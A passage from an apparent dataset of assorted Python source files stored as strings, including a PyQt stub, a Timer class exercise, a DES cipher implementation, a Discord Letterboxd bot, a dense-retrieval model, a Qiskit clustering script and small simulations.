QVBoxLayout()\r\nmain_w1.addWidget(text_field2,stretch=8)\r\nmain_w1.addLayout(v2,stretch=6)\r\n\r\ndef delete_check():\r\n    pass\r\n\r\ndef save_check():\r\n    pass\r\n\r\ndef checker():\r\n    pass\r\n\r\ndef add_teg():\r\n    pass\r\n\r\ndef delete_teg():\r\n    pass\r\n\r\ndef find_teg():\r\n    pass\r\n\r\nbtn.clicked.connect(delete_check)\r\nbtn2.clicked.connect(save_check)\r\nbtn3.clicked.connect(checker)\r\nbtn4.clicked.connect(add_teg)\r\nbtn5.clicked.connect(delete_teg)\r\nbtn6.clicked.connect(find_teg)\r\n\r\nwindow.show()\r\napp.exec()",
    "# Scenario\n# We need a class able to count seconds. Easy? Not as much as you may think as we're going to have some specific expectations.\n# Read them carefully as the class you're about write will be used to launch rockets carrying international missions to Mars. It's a great responsibility. We're counting on you!\n# Your class will be called Timer. Its constructor accepts three arguments representing hours (a value from range [0..23] - we will be using the military time), minutes (from range [0..59]) and seconds (from range [0..59]).\n# Zero is the default value for all of the above parameters. There is no need to perform any validation checks.\n\n# The class itself should provide the following facilities:\n# objects of the class should be \"printable\", i.e. they should be able to implicitly convert themselves into strings of the following form: \"hh:mm:ss\", with leading zeros added when any of the values is less than 10;\n# the class should be equipped with parameterless methods called next_second() and previous_second(), incrementing the time stored inside objects by +1/-1 second respectively.\n# Use the following hints:\n\n# all object's properties should be private;\n# consider writing a separate function (not method!) to format the time string.\n# Complete the template we've provided in the editor. Run your code and check whether the output looks the same as ours.\n###################################################################################################\n# Code\n# class Timer:\n#     def __init__( ??? ):\n#         #\n#         # Write code here\n#         #\n\n#     def __str__(self):\n#         #\n#         # Write code here\n#         #\n\n#     def next_second(self):\n#         #\n#         # Write code here\n#         #\n\n#     def prev_second(self):\n#         #\n#         # Write code here\n#         #\n\n\n# timer = Timer(23, 59, 59)\n# print(timer)\n# timer.next_second()\n# print(timer)\n# timer.prev_second()\n# print(timer)\n###################################################################################################\n\n# Expected output\n# 23:59:59\n# 00:00:00\n# 23:59:59\n\n###################################################################################################\n\n\nclass Timer:\n    def __init__(self, hrs=0, min=0, scn=0):\n        self.time = [hrs, min, scn]\n\n    def __str__(self):\n        return \"{:02d}:{:02d}:{:02d}\".format(self.time[0], self.time[1], self.time[2])\n\n    def next_second(self):\n        self.time[2] += 1\n        if self.time[2] == 60:\n            self.time[1:] = [self.time[1] + 1, 0]\n            if self.time[1] == 60:\n                self.time[:2] = [self.time[0] + 1, 0]\n                if self.time[0] == 24:\n                    self.time = [0, 0, 0]\n\n    def prev_second(self):\n\n        self.time[2] -= 1\n        if self.time[2] == -1:\n            self.time[1:] = [self.time[1] - 1, 0]\n            if self.time[1] == -1:\n                self.time[:2] = [self.time[0] - 1, 0]        \n                if self.time[0] == -1:\n                    self.time = [23, 59, 59]\n\n\ntimer = Timer(23, 59, 59)\nprint(timer)\ntimer.next_second()\nprint(timer)\ntimer.prev_second()\nprint(timer)\n",
    "# -*- coding: utf-8 -*-\r\n\"\"\"\r\nCreated on Fri Apr 12 07:14:33 2024\r\n\r\n@author: mail4\r\n\"\"\"\r\n\r\nimport numpy as np\r\nimport matplotlib.pyplot as plt\r\nfrom scipy.integrate import solve_ivp\r\n\r\n# Constants\r\nALPHA = 0.1  # Learning rate for the attack model\r\nBETA = 0.05  # Learning rate for defense\r\nK1 = 1.0     # Impact coefficient of attack\r\nK2 = 1.0     # Base effectiveness of defense\r\nK3 = 0.7     # Effectiveness of AI-driven defenses\r\n\r\n# Initial Conditions\r\nA0 = 1.0     # Initial attack capability\r\nD0 = 1.0     # Initial defense effectiveness\r\nS0 = 1.0     # Initial security state\r\n\r\n# Time\r\nT = np.linspace(0, 100, 500)  # Simulation time\r\n\r\ndef event_driven_response(E, C):\r\n    # Simplified model where E is event strength and C is cloud API responsiveness\r\n    return E * C\r\n\r\ndef ai_predict(E):\r\n    # Predictive model based on current event data\r\n    return ALPHA * np.log(1 + E)\r\n\r\n# Enhanced system dynamics with event-driven and AI predictive models\r\ndef enhanced_system(t, y):\r\n    A, D, S, E, C = y\r\n    dA_dt = ALPHA * A\r\n    dD_dt = BETA * D\r\n    dS_dt = -K1 * A * S + K2 * D * (1 - S) + K3 * (A * D) + event_driven_response(E, C)\r\n    dE_dt = -E  # Decay of events over time\r\n    dC_dt = 0.1 * (1 - C)  # Simulate some dynamics for Cloud API responsiveness\r\n    return [dA_dt, dD_dt, dS_dt, dE_dt, dC_dt]\r\n\r\n# Initial conditions include events (E) and cloud API responsiveness (C)\r\ninitial_conditions = [A0, D0, S0, 0.5, 0.5]  # Assume some initial events and moderate API responsiveness\r\n\r\n# Solve the enhanced system\r\nenhanced_solution = solve_ivp(enhanced_system, [T[0], T[-1]], initial_conditions, t_eval=T)\r\n\r\n# Plotting function for results\r\ndef plot_results(t, solution):\r\n    plt.figure(figsize=(12, 8))\r\n    plt.plot(t, solution.y[0], label='Attack Capability (A)')\r\n    plt.plot(t, solution.y[1], label='Defense Effectiveness (D)')\r\n    plt.plot(t, solution.y[2], label='System Security (S)')\r\n    plt.plot(t, solution.y[3], label='Event Strength (E)')\r\n    plt.plot(t, solution.y[4], label='Cloud API Responsiveness (C)')\r\n    plt.xlabel('Time')\r\n    plt.ylabel('Values')\r\n    plt.title('Simulation of AI-driven Cybersecurity Dynamics')\r\n    plt.legend()\r\n    plt.grid(True)\r\n    plt.show()\r\n\r\n# Execute the plot function to visualize the results\r\nplot_results(T, enhanced_solution)\r\n",
    "from BitVector import *\nimport sys\nclass DES():\n\n\n# class constructor - when creating a DES object , the\n# class \u2019s constructor is called and the instance variables\n# are initialized\n# note that the constructor specifies each instance of DES\n# be created with a key file (str)\n    \n\n    def __init__(self,key):\n\n\n    # within the constructor , initialize instance variable\n    # these could be the s-boxes , permutation boxes , and\n    # other variables you think each instance of the DES\n    # class would need .\n    # encrypt method declaration for students to implement\n    # Inputs : message_file (str), outfile (str)\n    # Return : void\n        \n\n\n        # Opening file to read key\n        file = open(key, \"r\")\n        self.key=key\n        key_string=file.read()\n        file.close()\n\n\n\n        #Key to bit vector\n        key_bitvector = BitVector(textstring = key_string)\n\n        #S boxes taken from the Lecture code!\n        s_boxes = {i:None for i in range(8)}\n\n        s_boxes[0] = [ [14,4,13,1,2,15,11,8,3,10,6,12,5,9,0,7],\n                    [0,15,7,4,14,2,13,1,10,6,12,11,9,5,3,8],\n                    [4,1,14,8,13,6,2,11,15,12,9,7,3,10,5,0],\n                    [15,12,8,2,4,9,1,7,5,11,3,14,10,0,6,13] ]\n\n        s_boxes[1] = [ [15,1,8,14,6,11,3,4,9,7,2,13,12,0,5,10],\n                    [3,13,4,7,15,2,8,14,12,0,1,10,6,9,11,5],\n                    [0,14,7,11,10,4,13,1,5,8,12,6,9,3,2,15],\n                    [13,8,10,1,3,15,4,2,11,6,7,12,0,5,14,9] ]\n\n        s_boxes[2] = [ [10,0,9,14,6,3,15,5,1,13,12,7,11,4,2,8],\n                    [13,7,0,9,3,4,6,10,2,8,5,14,12,11,15,1],\n                    [13,6,4,9,8,15,3,0,11,1,2,12,5,10,14,7],\n                    [1,10,13,0,6,9,8,7,4,15,14,3,11,5,2,12] ]\n\n        s_boxes[3] = [ [7,13,14,3,0,6,9,10,1,2,8,5,11,12,4,15],\n                    [13,8,11,5,6,15,0,3,4,7,2,12,1,10,14,9],\n                    [10,6,9,0,12,11,7,13,15,1,3,14,5,2,8,4],\n                    [3,15,0,6,10,1,13,8,9,4,5,11,12,7,2,14] ]\n\n        s_boxes[4] = [ [2,12,4,1,7,10,11,6,8,5,3,15,13,0,14,9],\n                    [14,11,2,12,4,7,13,1,5,0,15,10,3,9,8,6],\n                    [4,2,1,11,10,13,7,8,15,9,12,5,6,3,0,14],\n                    [11,8,12,7,1,14,2,13,6,15,0,9,10,4,5,3] ]  \n\n        s_boxes[5] = [ [12,1,10,15,9,2,6,8,0,13,3,4,14,7,5,11],\n                    [10,15,4,2,7,12,9,5,6,1,13,14,0,11,3,8],\n                    [9,14,15,5,2,8,12,3,7,0,4,10,1,13,11,6],\n                    [4,3,2,12,9,5,15,10,11,14,1,7,6,0,8,13] ]\n\n        s_boxes[6] = [ [4,11,2,14,15,0,8,13,3,12,9,7,5,10,6,1],\n                    [13,0,11,7,4,9,1,10,14,3,5,12,2,15,8,6],\n                    [1,4,11,13,12,3,7,14,10,15,6,8,0,5,9,2],\n                    [6,11,13,8,1,4,10,7,9,5,0,15,14,2,3,12] ]\n\n        s_boxes[7] = [ [13,2,8,4,6,15,11,1,10,9,3,14,5,0,12,7],\n                    [1,15,13,8,10,3,7,4,12,5,6,11,0,14,9,2],\n                    [7,11,4,1,9,12,14,2,0,6,10,13,15,3,5,8],\n                    [2,1,14,7,4,10,8,13,15,12,9,0,3,5,6,11] ]\n        \n        #Key permutations and shifts for round key gen also taken from the notes\n\n        key_permutation_1 = [56,48,40,32,24,16,8,0,57,49,41,33,25,17,\n        9,1,58,50,42,34,26,18,10,2,59,51,43,35,\n        62,54,46,38,30,22,14,6,61,53,45,37,29,21,\n        13,5,60,52,44,36,28,20,12,4,27,19,11,3]\n        \n        key_permutation_2 = [13,16,10,23,0,4,2,27,14,5,20,9,22,18,11,\n        3,25,7,15,6,26,19,12,1,40,51,30,36,46,\n        54,29,39,50,44,32,47,43,48,38,55,33,52,\n        45,41,49,35,28,31]\n\n        pbox_permutation=[15, 6, 19 ,20 ,28, 11, 27, 16,\n        0, 14, 22, 25, 4, 17, 30, 9,\n        1, 7, 23, 13, 31, 26, 2 ,8,\n        18 ,12 ,29, 5, 21, 10, 3 ,24]\n\n        \n        shifts_for_round_key_gen = [1,1,2,2,2,2,2,2,1,2,2,2,2,2,2,1]\n\n        # Just to make sure it is accessible to other instances of the class \n        self.s_boxes=s_boxes\n        self.pbox_permutation=pbox_permutation\n        \n        # following function Taken from lecture notes generate_round_keys.py\n\n        key_bitvector = key_bitvector.permute(key_permutation_1)\n        round_keys = []\n        key = key_bitvector.deep_copy()\n        for round_count in range(16):\n            [LKey, RKey] = key.divide_into_two()\n            shift = shifts_for_round_key_gen[round_count]\n            LKey << shift\n            RKey << shift\n            key = LKey + RKey\n            round_key = key.permute(key_permutation_2)\n            round_keys.append(round_key)\n\n         # Just to make sure it is accessible to other instances of the class \n\n        self.word=round_keys\n\n\n        # Just a simple if else to implement the respective functions\n        # Should it call the functions here or outside in main\n        if(sys.argv[1])=='-e':\n            \n            self.encrypt(message_file=sys.argv[2],outfile=sys.argv[4])\n        elif(sys.argv[1])=='-d':\n            \n            self.decrypt(encrypted_file=sys.argv[2],outfile=sys.argv[4])\n        elif(sys.argv[1])=='-i':\n           \n            self.ppm(message_file=sys.argv[2],outfile=sys.ar",
    "def min_coins(money):\r\n    coins = [10, 5, 1]  # Denominaciones disponibles\r\n    numcoins = [0, 0, 0]  # Inicializamos el conteo de monedas de 10, 5 y 1\r\n\r\n    # Iteramos sobre las denominaciones disponibles\r\n    for i, coin in enumerate(coins):\r\n        numcoins[i] = money // coin\r\n        money %= coin\r\n        \r\n    return numcoins\r\n\r\n# Funci\u00f3n para mostrar el resultado\r\ndef display_coins(numcoins):\r\n    denominations = [10, 5, 1]\r\n    results = []\r\n\r\n    for i, coin_count in enumerate(numcoins):\r\n        if coin_count > 0:\r\n            results.append(f\"{coin_count} moneda(s) de {denominations[i]}\")\r\n\r\n    return \" + \".join(results)\r\n\r\n# Funci\u00f3n principal para interactuar con el usuario\r\ndef main():\r\n    # Solicitar al usuario que ingrese la cantidad de dinero\r\n    while True:\r\n        try:\r\n            money = int(input(\"Ingrese la cantidad de dinero (entero mayor o igual a 1): \"))\r\n            if money < 1:\r\n                print(\"Por favor, ingrese un n\u00famero entero mayor o igual a 1.\")\r\n            else:\r\n                break\r\n        except ValueError:\r\n            print(\"Numero invalido Por favor, ingrese un n\u00famero entero mayor o igual a 1 \")\r\n\r\n    # Calcular la cantidad m\u00ednima de monedas necesarias\r\n    num_coins = min_coins(money)\r\n\r\n    # Mostrar el resultado\r\n    print(f\"Para {money} dolares, se necesitan las siguientes monedas: \")\r\n    print(display_coins(num_coins))\r\n\r\n# Ejecutar el programa principal\r\nif __name__ == \"__main__\":\r\n    main()",
    "from letterboxdpy import user\nfrom discord import app_commands\nimport discord, os, requests, random, json\nfrom discord import Embed, Intents, Interaction\n\nLETTERBOXD_DISCORD_TOKEN = os.getenv(\"LETTERBOXD_DISCORD_TOKEN\")\nCOLOURS = [0xff8000, 0x00e054, 0x40bcf4]\n\nclient = discord.Client(intents=Intents.all())\ntree = app_commands.CommandTree(client)\n\n@client.event\nasync def on_ready() -> None:\n    try:\n        await tree.sync()\n        await client.change_presence(activity=discord.Streaming(name=\"/help\", url=\"https://twitch.tv/gothamchess\"))\n        print(f\"----- {client.user.name} is Online -----\\nServers: {len(client.guilds)}\\nMembers: {len(client.users)}\")\n\n    except Exception:\n        print(Exception)\n\n@tree.command(description=\"Fetch Letterboxd Profile\")\n@app_commands.describe(username=\"Found after the / in letterboxd.com\")\nasync def profile(interaction: Interaction, username: str):\n\n    profile_data = user.User(username)\n    json_dict = profile_data.jsonify()\n\n    if json_dict.get(\"avatar\", {}).get(\"exists\"):\n        url = json_dict.get(\"avatar\", {}).get(\"url\")\n    else:\n        url = \"https://w7.pngwing.com/pngs/183/847/png-transparent-letterboxd-iphone-app-store-film-iphone-electronics-orange-sphere.png\"\n\n    embed = Embed(description=f\"[{username}'s Letterboxd Profile](https://letterboxd.com/{username})\", color=random.choice(COLOURS))\n    embed.set_thumbnail(url=url)\n    embed.set_author(name=username, icon_url=url)\n    embed.add_field(name=\"ID\", value=json_dict.get(\"id\"), inline=True)\n    embed.add_field(name=\"Display name\", value=json_dict.get(\"display_name\", \"\"), inline=True)\n    embed.add_field(name=\"Bio\", value=json_dict.get(\"bio\", \"\"), inline=True)\n    embed.add_field(name=\"Followers\", value=json_dict.get(\"stats\", {}).get(\"followers\"), inline=True)\n    embed.add_field(name=\"Following\", value=json_dict.get(\"stats\", {}).get(\"following\"), inline=True)\n    embed.add_field(name=\"Location\", value=json_dict.get(\"location\", \"\"), inline=True)\n    embed.add_field(name=\"Watchlist length\", value=json_dict.get(\"watchlist_length\"), inline=True)\n    embed.add_field(name=\"Films\", value=json_dict.get(\"stats\", {}).get(\"films\"), inline=True)\n    embed.add_field(name=\"Films this year\", value=json_dict.get(\"stats\", {}).get(\"this_year\"), inline=True)\n    embed.add_field(name=\"Lists\", value=json_dict.get(\"stats\", {}).get(\"list\"), inline=True)\n\n    await interaction.response.send_message(embed=embed)\n\n\nclient.run(LETTERBOXD_DISCORD_TOKEN)\n",
    "import lightning as pl\nimport numpy as np\nimport torch\nfrom lightning.pytorch.utilities import grad_norm\nfrom torch import nn\nfrom transformers import ElectraModel\n\n\nclass QueryEncoder(nn.Module):\n    def __init__(\n        self, pretrained_model_name_or_path: str, num_trainable_layers: int = 2\n    ):\n        super(QueryEncoder, self).__init__()\n        self.electra = ElectraModel.from_pretrained(pretrained_model_name_or_path)\n\n        for param in self.electra.parameters():\n            param.requires_grad = False\n\n        for count, layer in enumerate(\n            self.electra.encoder.layer[-num_trainable_layers:]\n        ):\n            for param in layer.parameters():\n                param.requires_grad = True\n\n    def forward(self, input_ids: torch.Tensor, attention_mask: torch.Tensor = None):\n        outputs = self.electra(\n            input_ids=input_ids,\n            attention_mask=attention_mask,\n            output_attentions=False,\n            output_hidden_states=False,\n        )\n        sequence_output = outputs.last_hidden_state\n        cls_token_output = sequence_output[:, 0, :]\n        return cls_token_output\n\n\nclass ContextEncoder(nn.Module):\n    def __init__(\n        self, pretrained_model_name_or_path: str, num_trainable_layers: int = 2\n    ):\n        super(ContextEncoder, self).__init__()\n        self.electra = ElectraModel.from_pretrained(pretrained_model_name_or_path)\n\n        for param in self.electra.parameters():\n            param.requires_grad = False\n\n        for count, layer in enumerate(\n            self.electra.encoder.layer[-num_trainable_layers:]\n        ):\n            for param in layer.parameters():\n                param.requires_grad = True\n\n    def forward(self, input_ids: torch.Tensor, attention_mask: torch.Tensor = None):\n        outputs = self.electra(\n            input_ids=input_ids,\n            attention_mask=attention_mask,\n            output_attentions=False,\n            output_hidden_states=False,\n        )\n        sequence_output = outputs.last_hidden_state\n        cls_token_output = sequence_output[:, 0, :]\n        return cls_token_output\n\n\nclass DPR(pl.LightningModule):\n    def __init__(\n        self,\n        pretrained_model_name_or_path: str,\n        num_query_trainable_layers: int = 2,\n        num_context_trainable_layers: int = 2,\n        learning_rate: float = 1e-3,\n        weight_decay: float = 1e-2,\n    ):\n        super(DPR, self).__init__()\n        self.learning_rate = learning_rate\n        self.weight_decay = weight_decay\n        self.query_encoder = QueryEncoder(\n            pretrained_model_name_or_path,\n            num_trainable_layers=num_query_trainable_layers,\n        )\n        self.context_encoder = ContextEncoder(\n            pretrained_model_name_or_path,\n            num_trainable_layers=num_context_trainable_layers,\n        )\n        self.criteria = nn.CrossEntropyLoss()\n        self.save_hyperparameters()\n\n    def forward(\n        self,\n        query_input_ids: torch.Tensor,\n        query_attention_mask: torch.Tensor,\n        context_input_ids: torch.Tensor,\n        context_attention_mask: torch.Tensor,\n    ):\n        query_embeddings = self.query_encoder(query_input_ids, query_attention_mask)\n        context_embeddings = self.context_encoder(\n            context_input_ids, context_attention_mask\n        )\n        query_embeddings_t = query_embeddings.transpose(0, 1)\n        similarity_scores = torch.matmul(context_embeddings, query_embeddings_t)\n        return similarity_scores, query_embeddings, context_embeddings\n\n    def _calc_scores(\n        self,\n        query_input_ids: torch.Tensor,\n        query_attention_mask: torch.Tensor,\n        context_input_ids: torch.Tensor,\n        context_attention_mask: torch.Tensor,\n        bm25_input_ids: torch.Tensor | None,\n        bm25_attention_mask: torch.Tensor | None,\n        include_bm25: bool = True,\n    ):\n\n        # Memorize original shape first\n        bm25_input_shape = bm25_input_ids.shape\n        bm25_attention_mask_shape = bm25_attention_mask.shape\n\n        # Reshape to 2D for encoding\n        bm25_input_ids = bm25_input_ids.reshape(-1, bm25_input_shape[-1])\n        bm25_attention_mask = bm25_attention_mask.reshape(\n            -1, bm25_attention_mask_shape[-1]\n        )\n\n        # query embeddings\n        query_embeddings = self.query_encoder(query_input_ids, query_attention_mask)\n\n        # context embeddings\n        context_embeddings = self.context_encoder(\n            context_input_ids, context_attention_mask\n        )\n\n        # calculate in-batch scores\n        in_batch_scores = torch.matmul(query_embeddings, context_embeddings.t())\n\n        if not include_bm25:\n            return in_batch_scores\n\n        # bm25 embeddings\n        bm25_embeddings = self.context_encoder(bm25_input_ids, bm25_attention_mask)\n\n        # calculate bm25 scores\n        bm25_embeddings_r = bm25_embeddings.reshape(\n            bm25_input_shape[0], bm25_input_shape[1], -1\n        )\n        bm25_embeddings_t = bm2",
    "from qiskit import QuantumCircuit\nfrom qiskit.quantum_info import SparsePauliOp\nfrom qiskit.transpiler.preset_passmanagers import generate_preset_pass_manager\nfrom qiskit_ibm_runtime import QiskitRuntimeService, EstimatorV2 as Estimator\nfrom qiskit_machine_learning.datasets import ad_hoc_data\nimport matplotlib.pyplot as plt\nimport numpy as np\nfrom qiskit.circuit.library import ZZFeatureMap\nfrom qiskit.primitives import Sampler\nfrom qiskit_algorithms.state_fidelities import ComputeUncompute\nfrom qiskit_machine_learning.kernels import FidelityQuantumKernel\nfrom sklearn.cluster import SpectralClustering\nfrom sklearn.metrics import normalized_mutual_info_score\n\nadhoc_dimension = 12\ntrain_features, train_labels, test_features, test_labels, adhoc_total = ad_hoc_data(\n    training_size=25,\n    test_size=0,\n    n=adhoc_dimension,\n    gap=0.6,\n    plot_data=False,\n    one_hot=False,\n    include_sample_total=True,\n)\n\n\nplt.figure(figsize=(5, 5))\nplt.ylim(0, 2 * np.pi)\nplt.xlim(0, 2 * np.pi)\nplt.imshow(\n    np.asmatrix(adhoc_total).T,\n    interpolation=\"nearest\",\n    origin=\"lower\",\n    cmap=\"RdBu\",\n    extent=[0, 2 * np.pi, 0, 2 * np.pi],\n)\n\n\ndef plot_features(ax, features, labels, class_label, marker, face, edge, label):\n    # A train plot\n    ax.scatter(\n        # x coordinate of labels where class is class_label\n        features[np.where(labels[:] == class_label), 0],\n        # y coordinate of labels where class is class_label\n        features[np.where(labels[:] == class_label), 1],\n        marker=marker,\n        facecolors=face,\n        edgecolors=edge,\n        label=label,\n    )\n\n# A label plot\nplot_features(plt, train_features, train_labels, 0, \"s\", \"w\", \"b\", \"B\")\n\n# B label plot\nplot_features(plt, train_features, train_labels, 1, \"o\", \"w\", \"r\", \"B\")\n\nplt.legend(bbox_to_anchor=(1.05, 1), loc=\"upper left\", borderaxespad=0.0)\nplt.title(\"Ad hoc dataset for clustering\")\n\n# plt.show()\n\nadhoc_feature_map = ZZFeatureMap(feature_dimension=adhoc_dimension, reps=2, entanglement=\"linear\")\n\nadhoc_kernel = FidelityQuantumKernel(feature_map=adhoc_feature_map)\n\nadhoc_matrix = adhoc_kernel.evaluate(x_vec=train_features)\n\nplt.figure(figsize=(5, 5))\nplt.imshow(np.asmatrix(adhoc_matrix), interpolation=\"nearest\", origin=\"upper\", cmap=\"Greens\")\nplt.title(\"Ad hoc clustering kernel matrix\")\n# plt.show()\n\nadhoc_spectral = SpectralClustering(2, affinity=\"precomputed\")\n\ncluster_labels = adhoc_spectral.fit_predict(adhoc_matrix)\n\nprint(cluster_labels)\n\ncluster_score = normalized_mutual_info_score(cluster_labels, train_labels)\n\nprint(f\"Clustering score: {cluster_score}\")\n\n",
    "import requests\nimport pandas as pd\n\n# Vorbereitung f\u00fcr API-Anfrage\nstates = [\"NATIONAL\",\"BW\",\"BY\",\"BE\",\"BB\",\"HB\",\"HH\",\"HE\",\"MV\",\"NI\",\"NW\",\"RP\",\"SL\",\"SN\",\"ST\",\"SH\",\"TH\"] # Liste aller Bundesl\u00e4nder\nyears = [str(1999 + i) for i in range(1, 32)] # Auflistung Jahre 2000 - 2030\n\n# Abfrage nach Muster: Je Staat werden alle Jahre nacheinander abgefragt und zwischengespeichert\n# Am Ende werden dann alle zwischengespeicherte DataFrames zusammengef\u00fchrt.\nfull_data = []\nfor s in states:\n  states_data = []\n  for y in years:\n    r = requests.get(f\"https://feiertage-api.de/api/?jahr={y}&nur_land={s}\")\n    data = r.json()\n    df_new = pd.DataFrame.from_dict(data, orient='index').reset_index() \n    df_new.columns = ['Feiertag', 'Datum', 'Hinweis']\n    df_new[s] = 1\n    states_data.append(df_new) # Hier wird immer ein DataFrame mit Informationen eines Jahr f\u00fcr ein Bundesland hinzugef\u00fcgt\n  year_data = pd.concat(states_data, axis=0) # Hier werden dann alle Jahre f\u00fcr ein Bundesland zusammengebracht\n  full_data.append(year_data) # Hier werden alle DataFrames hinzugef\u00fcgt\n\n# Alle DataFrames werden nacheinander gemerged und doppelte Spalten ausgeschlossen, sowie die Formatierung und Null Werte \u00fcberarbeitet.\nlast_df = full_data[0] \nfor i in full_data[1:]:\n  df = pd.merge(left=last_df, right=i, on=\"Datum\", how=\"outer\")\n  df[\"Feiertag_x\"].fillna(df[\"Feiertag_y\"], inplace=True)\n  df[\"Hinweis_x\"].fillna(df[\"Hinweis_y\"], inplace=True)\n  df.drop([\"Feiertag_y\", \"Hinweis_y\"], axis=1, inplace=True)\n  df.rename(columns={\"Feiertag_x\": \"Feiertag\", \"Hinweis_x\":\"Hinweis\"}, inplace=True)\n  last_df = df\n\n# Bei Feiertagen, die es nur in bestimmten Bundesl\u00e4nder gibt ist der Wert bei L\u00e4nder, die diesen Tag nicht feiern Null\n# Daher werden Null Values in Integer 0 umgewandelt.\ndf.fillna(0, inplace=True)\ndf\n\n# Zuletzt wird der fertige DataFrame als csv Datei abgespeichert.\ndf.to_csv(\"deutsche_feiertage__2000_2030.csv\", index=False)",
    "from Biblio import * \r\nfrom EditableTable import *\r\nfrom ModelEvaluationInterface import *\r\n\r\n\r\nclass DataControlInterface(tk.Frame):\r\n    def __init__(self, parent):\r\n        tk.Frame.__init__(self, parent)\r\n        self.parent = parent\r\n\r\n        sidebar_frame = ttk.Frame(self, relief=tk.SUNKEN, padding=2, style='My.TFrame') \r\n        sidebar_frame.pack(side=tk.LEFT, fill=tk.Y, padx=0, pady=0)\r\n\r\n        import_button = ttk.Button(sidebar_frame, text=\"Import File\", command=self.import_data, width=30, style='My.TButton')\r\n        import_button.pack(pady=10)\r\n\r\n        create_button = ttk.Button(sidebar_frame, text=\"Create New Table\", command=self.create_new_table, width=30, style='My.TButton')\r\n        create_button.pack(pady=10)\r\n\r\n        self.editable_table = EditableTable(self)\r\n        self.editable_table.pack(side=tk.LEFT, expand=True, fill=\"both\", padx=10, pady=10)\r\n\r\n        visualization_button = ttk.Button(sidebar_frame, text=\"Data Visualization\", command=self.perform_visualization, width=30, style='My.TButton')\r\n        visualization_button.pack(pady=10)\r\n\r\n        self.data_management_button = ttk.Button(sidebar_frame, text=\"Data Management\", command=self.data_management_dialog, width=30, style='My.TButton')\r\n        self.data_management_button.pack(pady=10, padx=10)\r\n\r\n        ml_button = ttk.Button(sidebar_frame, text=\"Machine Learning Algorithms\", command=self.run_ml_algorithms, width=30, style='My.TButton')\r\n        ml_button.pack(pady=10)\r\n        \r\n        self.ml_algorithms_window = None\r\n        \r\n    def data_management_dialog(self):\r\n        if self.editable_table.df is None or self.editable_table.df.empty:\r\n            messagebox.showinfo(\"Information\", \"Please import data or create a new table.\")\r\n            return\r\n\r\n        self.ml_algorithms_window = None\r\n\r\n        self.data_management_window = tk.Toplevel(self)\r\n        self.data_management_window.protocol(\"WM_DELETE_WINDOW\", self.data_management_window.destroy)\r\n\r\n        # Header frame with buttons\r\n        header_frame = ttk.Frame(self.data_management_window)\r\n        header_frame.pack(pady=10)\r\n\r\n        # Button for normalization\r\n        normalization_button = ttk.Button(header_frame, text=\"Normalization\", command=self.show_normalization_options, width=15, style='My.TButton')\r\n        normalization_button.grid(row=0, column=0, padx=0)\r\n\r\n        # Button for handling null values\r\n        null_values_button = ttk.Button(header_frame, text=\"Manage Null Values\", command=self.show_null_values_options, width=20, style='My.TButton')\r\n        null_values_button.grid(row=0, column=1, padx=0)\r\n\r\n        # Button for encoding categorical variables\r\n        encode_categorical_button = ttk.Button(header_frame, text=\"Encode Categorical Variables\", command=self.encode_categorical_variables, width=30, style='My.TButton')\r\n        encode_categorical_button.grid(row=0, column=2, padx=0)\r\n\r\n        # Frame to hold normalization, null values, and encoding options\r\n        self.options_frame = ttk.Frame(self.data_management_window)\r\n        self.options_frame.pack(pady=10)\r\n        \r\n    def perform_visualization(self):\r\n        if self.editable_table.df is None or self.editable_table.df.empty:\r\n            messagebox.showinfo(\"Information\", \"Veuillez importer des donn\u00e9es ou cr\u00e9er une nouvelle table.\")\r\n            return\r\n\r\n        self.ml_algorithms_window = None\r\n\r\n        # Create a new window for visualization\r\n        visualization_window = tk.Toplevel(self)\r\n        visualization_window.title(\"Visualisation des Donn\u00e9es\")\r\n        visualization_window.geometry(\"800x700\")  # Set the window size\r\n\r\n        # Create a Notebook to organize visualizations in tabs\r\n        notebook = ttk.Notebook(visualization_window)\r\n        notebook.pack(fill=tk.BOTH, expand=True)\r\n\r\n        # Example: Bar chart\r\n        bar_chart_frame = ttk.Frame(notebook)\r\n        notebook.add(bar_chart_frame, text=\"Bar Chart\")\r\n\r\n        # Determine appropriate data for bar chart\r\n        numeric_columns = self.editable_table.df.select_dtypes(include=[np.number]).columns\r\n        if numeric_columns.empty:\r\n            plt.figure(figsize=(6, 4))\r\n            plt.text(0.5, 0.5, \"No numeric columns available for the bar chart.\", ha=\"center\")\r\n        else:\r\n            plt.figure(figsize=(6, 4))\r\n            plt.bar(numeric_columns, self.editable_table.df[numeric_columns].iloc[0])\r\n            plt.title(\"Example Bar Chart\")\r\n            plt.xlabel(\"Columns\")\r\n            plt.ylabel(\"Values\")\r\n\r\n        canvas_chart = FigureCanvasTkAgg(plt.gcf(), master=bar_chart_frame)\r\n        canvas_chart.draw()\r\n        canvas_chart.get_tk_widget().pack(side=tk.TOP, fill=tk.BOTH, expand=1)\r\n\r\n        # Add a brief definition in English\r\n        definition_label = tk.Label(bar_chart_frame, text=\"Bar charts are used to visualize the distribution of values \"\r\n                                                          \"across different numeric columns in the dataset.\")\r\n        definition",
    "import time\nimport random\nimport os\nimport platform\n\n\"\"\"\nProgramer Notes\n- created in a way to enable a outside user to add more alleles if they wanted.\n- clearly labeled survival and mutation chances to further customize simulation environment\n- added support for 3 operating systems. this does not mean one \".exe\" file will work on all 3. the program would need to be \n\"\"\"\n\n\n# Logic\n\n# Class\nclass Rabbit:\n    def __init__(self, allele):\n        self.allele = allele\n        \n        \n# Functions        \ndef generate_starting_rabbit_count(num_rabbits):\n    population = [] # save location for starting number of rabbits\n    for i in range(num_rabbits): # loop to assign random allele to preselected number of rabbits\n        allele = random.choice([\"WW\", \"Ww\", \"ww\"])\n        rabbit = Rabbit(allele)\n        population.append(rabbit)\n    return population # returns a number of rabbits and their starting alleles\n\ndef count_alleles(population):\n    allele_counts = {\"WW\": 0, \"Ww\": 0, \"ww\": 0} # will display out on the screen the total number of rabbits\n    for rabbit in population:\n        allele_counts[rabbit.allele] += 1\n    return allele_counts\n\ndef simulate_generation(population):\n    # Select rabbits to remove (simulate death)\n    surviving_rabbits = []\n    has_WW = any(rabbit.allele == \"WW\" for rabbit in population)\n    has_Ww = any(rabbit.allele == \"Ww\" for rabbit in population)\n    has_ww = any(rabbit.allele == \"ww\" for rabbit in population)\n\n    for rabbit in population:\n        # survival rates\n        if rabbit.allele == \"Ww\": # This next line lowers the survival chance of just \"Ww\" rabbits as during testing, they seemed to explode in poulation\n            if random.random() < 0.3:  # chance of survival for \"Ww\" rabbits\n                surviving_rabbits.append(rabbit)\n        else:\n            if random.random() < 0.4:  # 40% chance of survival for all other 